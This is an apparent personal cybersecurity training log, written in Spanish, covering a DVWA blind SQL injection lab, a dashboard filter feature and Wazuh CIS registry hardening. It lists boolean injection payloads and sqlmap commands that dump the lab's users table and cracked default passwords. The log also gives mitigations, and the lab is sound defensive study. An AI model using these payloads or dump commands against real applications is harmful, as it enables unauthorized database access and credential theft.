# Día 7 — DVWA SQL Injection Blind + App MS Filters + Wazuh CIS

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application  
**Táctica:** Initial Access (TA0001)

## 🔓 DVWA — SQL Injection Blind (Low)

### ¿Qué es Blind SQLi?
A diferencia del SQLi normal que devuelve datos directamente, Blind SQLi solo 
responde de manera booleana — verdadero o falso. El servidor no muestra los datos, 
solo indica si la condición es correcta o no. Esto hace necesaria la automatización.

### Explotación manual
| Input | Respuesta | Significado |
|---|---|---|
| `1` | User ID exists | Comportamiento normal |
| `99` | User ID is MISSING | ID inexistente |
| `1' AND '1'='1` | exists | Condición verdadera — vulnerable |
| `1' AND '1'='2` | MISSING | Condición falsa — confirmado |
| `1' AND substring(version(),1,2)='10` | exists | Versión empieza con 10 — MariaDB |

### Automatización con sqlmap
| Comando | Output |
|---|---|
| `sqlmap -u "..sqli_blind.." --dbs --batch` | Bases de datos: dvwa, information_schema |
| `sqlmap ... -D dvwa --tables --batch` | Tablas: guestbook, users |
| `sqlmap ... -D dvwa -T users --dump --batch` | 5 usuarios + hashes MD5 crackeados |

### Credenciales extraídas
| Usuario | Password |
|---|---|
| admin | password |
| gordonb | abc123 |
| 1337 | charley |
| pablo | letmein |
| smithy | password |

### SQLi normal vs Blind SQLi
- **Normal:** devuelve múltiples datos directamente — rápido
- **Blind:** respuesta booleana — extracción carácter por carácter — lento — requiere automatización
- sqlmap realizó 2000+ requests HTTP para extraer los datos completos

### Mitigación
- Prepared statements — nunca concatenar input en queries SQL
- Ocultar mensajes de error — respuesta genérica al usuario
- WAF para detectar patrones de inyección

## 🔵 App MS Security
- Filtros por severidad agregados al Alert Dashboard
- Botones: All / Critical / High / Medium / Low
- Filtrado dinámico con React state — `filter === "All" ? alerts : alerts.filter(...)`
- Commit subido a GitHub: `Add severity filters to Alert Dashboard`

## 🟡 Wazuh — CIS Benchmark Correcciones

### Alertas del día
| Rule ID | Nivel | Descripción |
|---|---|---|
| 19005 | 9 | CIS Benchmark score <30% — correcciones en progreso |
| 60776 | 7 | SessionEnv x5 — servicio disabled, alertas residuales |

### Mitigaciones aplicadas
| Configuración | Antes | Después | Impacto |
|---|---|---|---|
| ConsentPromptBehaviorAdmin | 0 — elevación silenciosa | 2 — escritorio seguro | UAC ahora avisa cuando un programa intenta obtener permisos de administrador |
| NoDriveTypeAutoRun | No configurado | 255 — todos deshabilitados | Ningún hardware conectado puede ejecutar código automáticamente |

### Lección
Dos configuraciones simples de registro reducen significativamente la superficie 
de ataque — UAC activo evita que malware escale privilegios silenciosamente, 
AutoRun deshabilitado elimina un vector de infección histórico via USB.
